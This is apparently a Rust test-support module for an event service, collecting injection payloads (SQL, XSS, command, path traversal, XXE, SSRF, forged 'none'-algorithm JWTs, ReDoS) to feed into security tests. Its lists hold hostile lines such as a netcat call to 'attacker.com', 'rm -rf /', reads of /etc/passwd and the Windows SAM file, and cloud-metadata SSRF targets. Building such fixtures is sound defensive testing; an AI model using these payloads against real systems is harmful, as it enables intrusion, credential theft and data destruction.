//! Security Attack Payloads
//!
//! This module provides a comprehensive collection of malicious payloads
//! for security testing, including SQL injection, XSS, command injection,
//! path traversal, and other attack vectors.

#![allow(dead_code)]

use serde_json::json;

/// SQL injection attack payloads
pub mod sql_injection {
    /// Basic SQL injection attempts
    pub fn basic_payloads() -> Vec<&'static str> {
        vec![
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            "1' OR '1' = '1",
            "' OR 'x'='x",
            "1' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "1' AND '1'='1",
        ]
    }

    /// Advanced SQL injection with nested queries
    pub fn advanced_payloads() -> Vec<&'static str> {
        vec![
            "1' UNION SELECT username, password FROM users--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "'; DROP TABLE events; --",
            "1'; DELETE FROM events WHERE '1'='1",
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND BENCHMARK(5000000,MD5('A'))--",
            "' OR '1'='1' UNION SELECT NULL, version()--",
        ]
    }

    /// Blind SQL injection payloads
    pub fn blind_payloads() -> Vec<&'static str> {
        vec![
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64--",
            "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--",
            "1' AND IF(1=1, SLEEP(5), 0)--",
        ]
    }
}

/// Cross-site scripting (XSS) attack payloads
pub mod xss {
    /// Basic XSS payloads
    pub fn basic_payloads() -> Vec<&'static str> {
        vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]
    }

    /// Encoded XSS payloads
    pub fn encoded_payloads() -> Vec<&'static str> {
        vec![
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        ]
    }

    /// Event handler XSS
    pub fn event_handler_payloads() -> Vec<&'static str> {
        vec![
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox('XSS')",
        ]
    }
}

/// Command injection payloads
pub mod command_injection {
    /// Basic command injection
    pub fn basic_payloads() -> Vec<&'static str> {
        vec![
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "&& id",
            "|| uname -a",
            "`ls`",
            "$(whoami)",
            "; rm -rf /",
            "| nc attacker.com 4444",
        ]
    }

    /// Windows command injection
    pub fn windows_payloads() -> Vec<&'static str> {
        vec![
            "& dir",
            "| type C:\\Windows\\System32\\config\\sam",
            "&& net user",
            "|| ipconfig",
        ]
    }
}

/// Path traversal payloads
pub mod path_traversal {
    /// Basic directory traversal
    pub fn basic_payloads() -> Vec<&'static str> {
        vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..;/..;/..;/etc/passwd",
            "./.././.././.././etc/passwd",
        ]
    }

    /// Null byte injection
    pub fn null_byte_payloads() -> Vec<&'static str> {
        vec![
            "../../../etc/passwd%00",
            "../../../etc/passwd\0",
            "file.txt%00.jpg",
        ]
    }
}

/// LDAP injection payloads
pub mod ldap_injection {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin)(|(password=*))",
            "*)(objectClass=*",
            "*)(&(objectClass=*",
        ]
    }
}

/// XML injection payloads
pub mod xml_injection {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><foo>&xxe;</foo>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
        ]
    }
}

/// NoSQL injection payloads
pub mod nosql_injection {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "{\"$gt\": \"\"}",
            "{\"$ne\": null}",
            "{\"$regex\": \".*\"}",
            "{'$where': 'sleep(5000)'}",
        ]
    }
}

/// Header injection payloads
pub mod header_injection {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "test\r\nX-Injected: true",
            "test\nX-Injected: true",
            "test%0d%0aX-Injected: true",
            "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK",
        ]
    }
}

/// Size exhaustion payloads
pub mod size_exhaustion {
    use serde_json::json;

    /// Create a very large string
    pub fn large_string(size_mb: usize) -> String {
        "A".repeat(size_mb * 1024 * 1024)
    }

    /// Create deeply nested JSON
    pub fn deeply_nested_json(depth: usize) -> serde_json::Value {
        let mut current = json!({"value": "end"});
        for _ in 0..depth {
            current = json!({"nested": current});
        }
        current
    }

    /// Create JSON with many keys
    pub fn wide_json(keys: usize) -> serde_json::Value {
        let mut obj = serde_json::Map::new();
        for i in 0..keys {
            obj.insert(format!("key_{}", i), json!(format!("value_{}", i)));
        }
        json!(obj)
    }

    /// Create extremely long array
    pub fn large_array(size: usize) -> serde_json::Value {
        let items: Vec<_> = (0..size).map(|i| json!(i)).collect();
        json!(items)
    }
}

/// Format string attack payloads
pub mod format_string {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%p%p%p%p%p%p%p%p%p%p",
        ]
    }
}

/// Unicode and encoding attacks
pub mod unicode_attacks {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "\u{202e}admin\u{202d}", // Right-to-left override
            "\u{200b}admin",         // Zero-width space
            "\u{feff}admin",         // Zero-width no-break space
            "admin\u{0000}",         // Null character
            "ⓐⓓⓜⓘⓝ",                 // Circled letters
            "𝐚𝐝𝐦𝐢𝐧",                 // Mathematical bold
            "аdmin",                 // Cyrillic 'a'
        ]
    }
}

/// Prototype pollution payloads (for JSON/JavaScript contexts)
pub mod prototype_pollution {
    use serde_json::json;

    pub fn payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            ("__proto__", "polluted"),
            ("constructor.prototype", "polluted"),
            ("prototype", "polluted"),
        ]
    }

    /// Create prototype pollution attempt in JSON
    pub fn json_payload() -> serde_json::Value {
        json!({
            "__proto__": {
                "polluted": true
            }
        })
    }
}

/// SSRF (Server-Side Request Forgery) payloads
pub mod ssrf {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://169.254.169.254", // AWS metadata
            "http://metadata.google.internal",
            "http://0.0.0.0",
            "http://[::ffff:127.0.0.1]",
            "file:///etc/passwd",
            "gopher://localhost:25/",
        ]
    }
}

/// JWT attack payloads
pub mod jwt_attacks {
    use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
    use serde_json::json;

    /// None algorithm attack
    pub fn none_algorithm_token() -> String {
        // Header with "none" algorithm
        let header = URL_SAFE_NO_PAD.encode(r#"{"alg":"none","typ":"JWT"}"#);
        // Payload with admin claims
        let payload =
            URL_SAFE_NO_PAD.encode(r#"{"sub":"admin","aud":"xzepr-mcp","exp":9999999999}"#);
        format!("{}.{}.", header, payload)
    }

    /// Algorithm confusion (RS256 to HS256)
    pub fn algorithm_confusion_payload() -> String {
        // Would require actual key to generate
        // This is a placeholder structure
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.invalid".to_string()
    }

    /// JWT with modified claims
    pub fn tampered_claims() -> Vec<(&'static str, serde_json::Value)> {
        vec![
            ("sub", json!("admin")),
            ("scope", json!("xzepr:admin xzepr:delete xzepr:root")),
            ("exp", json!(9999999999i64)),
            ("iss", json!("https://attacker.com")),
        ]
    }
}

/// Regex DoS payloads (ReDoS)
pub mod redos {
    pub fn payloads() -> Vec<&'static str> {
        vec![
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
            "(a+)+",
            "(a|a)*",
            "(a|ab)*",
            "((a+)+)+",
        ]
    }
}

/// ULID/UUID injection payloads
pub mod identifier_injection {
    pub fn invalid_ulids() -> Vec<&'static str> {
        vec![
            "00000000000000000000000000",    // Too short
            "01HQKZ5VJ8QXR9BZVW3TN8C6XE!@#", // Invalid characters
            "ZZZZZZZZZZZZZZZZZZZZZZZZZZ",    // Out of range
            "../../../etc/passwd",           // Path traversal in ID
            "'; DROP TABLE events; --",      // SQL in ID
            "<script>alert('XSS')</script>", // XSS in ID
        ]
    }

    pub fn invalid_uuids() -> Vec<&'static str> {
        vec![
            "not-a-uuid",
            "12345678-1234-1234-1234-12345678901", // Too short
            "12345678-1234-1234-1234-1234567890123", // Too long
            "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", // Invalid hex
        ]
    }
}

/// Semver injection payloads
pub mod semver_injection {
    pub fn invalid_semvers() -> Vec<&'static str> {
        vec![
            "1.2",                                // Incomplete
            "1.2.3.4",                            // Too many parts
            "v1.2.3",                             // Invalid prefix
            "1.2.x",                              // Invalid patch
            "-1.0.0",                             // Negative version
            "1.0.0'; DROP TABLE--",               // SQL injection
            "1.0.0<script>alert('XSS')</script>", // XSS
            "999999999999999999999.0.0",          // Integer overflow
        ]
    }
}

/// Create test event data with injection payload
pub fn create_malicious_event(payload: &str) -> serde_json::Value {
    json!({
        "name": payload,
        "version": "1.0.0",
        "release": "test",
        "platform": "linux",
        "arch": "x86_64",
        "commit": "abc123"
    })
}

/// Create test event with all fields containing payload
pub fn create_fully_malicious_event(payload: &str) -> serde_json::Value {
    json!({
        "name": payload,
        "version": payload,
        "release": payload,
        "platform": payload,
        "arch": payload,
        "commit": payload
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sql_injection_payloads_not_empty() {
        assert!(!sql_injection::basic_payloads().is_empty());
        assert!(!sql_injection::advanced_payloads().is_empty());
        assert!(!sql_injection::blind_payloads().is_empty());
    }

    #[test]
    fn test_xss_payloads_not_empty() {
        assert!(!xss::basic_payloads().is_empty());
        assert!(!xss::encoded_payloads().is_empty());
        assert!(!xss::event_handler_payloads().is_empty());
    }

    #[test]
    fn test_command_injection_payloads_not_empty() {
        assert!(!command_injection::basic_payloads().is_empty());
        assert!(!command_injection::windows_payloads().is_empty());
    }

    #[test]
    fn test_path_traversal_payloads_not_empty() {
        assert!(!path_traversal::basic_payloads().is_empty());
        assert!(!path_traversal::null_byte_payloads().is_empty());
    }

    #[test]
    fn test_size_exhaustion_large_string() {
        let large = size_exhaustion::large_string(1);
        assert_eq!(large.len(), 1024 * 1024);
    }

    #[test]
    fn test_size_exhaustion_nested_json() {
        let nested = size_exhaustion::deeply_nested_json(10);
        assert!(nested.is_object());
    }

    #[test]
    fn test_size_exhaustion_wide_json() {
        let wide = size_exhaustion::wide_json(100);
        assert_eq!(wide.as_object().unwrap().len(), 100);
    }

    #[test]
    fn test_malicious_event_creation() {
        let event = create_malicious_event("' OR '1'='1");
        assert_eq!(event["name"], "' OR '1'='1");
        assert_eq!(event["version"], "1.0.0");
    }

    #[test]
    fn test_identifier_injection_payloads_not_empty() {
        assert!(!identifier_injection::invalid_ulids().is_empty());
        assert!(!identifier_injection::invalid_uuids().is_empty());
    }

    #[test]
    fn test_semver_injection_payloads_not_empty() {
        assert!(!semver_injection::invalid_semvers().is_empty());
    }

    #[test]
    fn test_prototype_pollution_json() {
        let payload = prototype_pollution::json_payload();
        assert!(payload.get("__proto__").is_some());
    }
}
